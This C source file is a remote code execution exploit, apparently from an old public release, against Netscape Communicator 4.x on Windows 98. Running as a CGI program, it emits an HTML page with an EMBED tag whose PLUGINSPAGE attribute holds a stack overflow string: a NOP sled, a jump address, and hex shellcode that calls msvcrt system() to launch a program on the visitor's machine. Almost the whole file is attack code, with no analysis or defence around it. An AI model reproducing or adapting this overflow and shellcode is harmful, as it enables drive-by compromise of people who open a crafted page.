/************************************************************************/
/*Netscape communicator 4.06J - 4.6J, 4.61e Exploit for Windows98*/
/**/
/*written by R00t Zer0(defcon0@ugtop.com)*/
/**/
/*  DEF CON ZERO( http://www.ugtop.com/defcon0/index.htm)*/
/************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>

#defineSTACK_LEN( 2135 )
#defineEMBED_TYPE_LEN( 150 )
#defineXPT_HDL_OFFSET( 588 )
#defineJMPS_OFFSET( 6 )
#defineJMP_EBX_ADDR( 0xbff7a06b )
#defineINT01H_ADDR( 0xbff73d30 )
#defineNOP_CODE( 0x90 )
#defineJMPS_CODE( 0xeb )
#defineFUNCTION"msvcrt.dll.system.exit."
#defineCOMMAND"welcome.exe"
#defineCMDLENP( 65 )


int
main( void )
{
  u_char win98_exec_code[100] = {
0xEB,0x4B,0x5B,0x53,0x32,0xE4,0x83,0xC3,0x0B,0x4B,0x88,0x23,0xB8,0x50,0x77,
0xF7,0xBF,0xFF,0xD0,0x8B,0xD0,0x52,0x43,0x53,0x52,0x32,0xE4,0x83,0xC3,0x06,
0x88,0x23,0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x8B,0xF0,0x5A,0x43,0x53,0x52,
0x32,0xE4,0x83,0xC3,0x04,0x88,0x23,0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x8B,
0xF8,0x43,0x53,0x83,0xC3,0x0B,0x32,0xE4,0x88,0x23,0xFF,0xD6,0x33,0xC0,0x50,
0xFF,0xD7,0xE8,0xB0,0xFF,0xFF,0xFF,0x00 };
  
  u_charexploit_code[ STACK_LEN ];
  u_charembed_type[ EMBED_TYPE_LEN ];
  u_longip;
  intloop;
  
  srand( ( u_int )time( 0 ) );
  
  bzero( exploit_code, sizeof( exploit_code ) );
  for( loop = 0; loop < XPT_HDL_OFFSET; loop++ )
    exploit_code [loop ] = NOP_CODE;
  
  /* make exploit code */
  ip = JMP_EBX_ADDR;
  exploit_code[ XPT_HDL_OFFSET - 4 ] = JMPS_CODE;
  exploit_code[ XPT_HDL_OFFSET - 3 ] = JMPS_OFFSET;
  exploit_code[ XPT_HDL_OFFSET + 3 ] = ( char)( 0xff & ( ip >> 24 ) );
  exploit_code[ XPT_HDL_OFFSET + 2 ] = ( char)( 0xff & ( ip >> 16 ) );
  exploit_code[ XPT_HDL_OFFSET + 1 ] = ( char)( 0xff & ( ip >> 8  ) );
  exploit_code[ XPT_HDL_OFFSET + 0 ] = ( char)( 0xff & ( ip >> 0  ) );
  
  win98_exec_code[ CMDLENP ] = strlen( COMMAND );
  strcat( exploit_code, win98_exec_code );
  strcat( exploit_code, FUNCTION );
  strcat( exploit_code, COMMAND );
  
  
  /* set random type */
  for( loop = 0; loop < EMBED_TYPE_LEN; loop++ )
    embed_type[ loop ] = 0x23 + ( rand() % 93 );
  
  /* print html */
  printf( "Content-type: text/html\n\n" );
  printf( "<HTML>\n" );
  printf( "<HEAD>\n" );
  printf( "<TITLE>Netscape communicator 4.x Exploit!!</TITLE>\n" );
  printf( "</HEAD>\n" );
  printf( "<BODY>\n" );
  
  printf( "<EMBED SRC=\"FreeUNYUN!\" PLUGINSPAGE=\"%s\" ", exploit_code );
  printf( "TYPE=\"%s\" WIDTH=\"1500\" HEIGHT=\"1000\">\n", embed_type  );
  printf( "</EMBED>\n</BODY>\n</HTML>\n" );
  
  return( 0 );
}



